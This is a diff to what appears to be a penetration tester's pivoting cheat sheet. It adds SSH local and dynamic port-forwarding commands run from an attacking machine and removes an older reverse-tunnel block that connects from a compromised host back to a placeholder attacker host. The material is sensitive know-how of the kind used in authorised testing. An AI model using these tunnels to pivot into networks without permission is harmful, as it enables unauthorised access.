@@ -17,24 +17,18 @@ cp /etc/proxychains.conf .
 
 ## SSH Tunnelling / Port Forwarding
 
+### Forward (local) Connections
+
+Created from our attacking machine, when we have SSH access to the target.
+
+Local port forwarding:
 ```
-ssh -L <COMPROMISED_LPORT>:<TARGET_RHOST>:<TARGET_RPORT> user@<COMPROMISED_LHOST> -fN
+ssh -L LOCAL_LPORT:TARGET_RHOST:TARGET_RPORT USER@TARGET_RHOST -fN
 ```
 
+Dynamic proxy:
 ```
-ssh -D <COMPROMISED_LPORT> <USER>@<COMPROMISED_LHOST> -fN
-```
-
-```
-# on your machine
-ssh-keygen
-vim ~/.ssh/authorized_keys
-command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty <ID_RSA.PUB>
-
-# on target machine
-sudo systemctl status ssh # sudo systemctl start ssh
-ssh -R <COMPROMISED_LPORT>:<TARGET_RHOST>:<TARGET_RPORT> <USERNAME>@<ATTACKER_RHOST> -i <KEYFILE> -fN
-# or ssh -R <COMPROMISED_LPORT> <USERNAME>@<ATTACKER_RHOST> -i <KEYFILE> -fN
+ssh -D LOCAL_LPORT USER@TARGET_RHOST -fN
 ```
 
 ## plink.exe
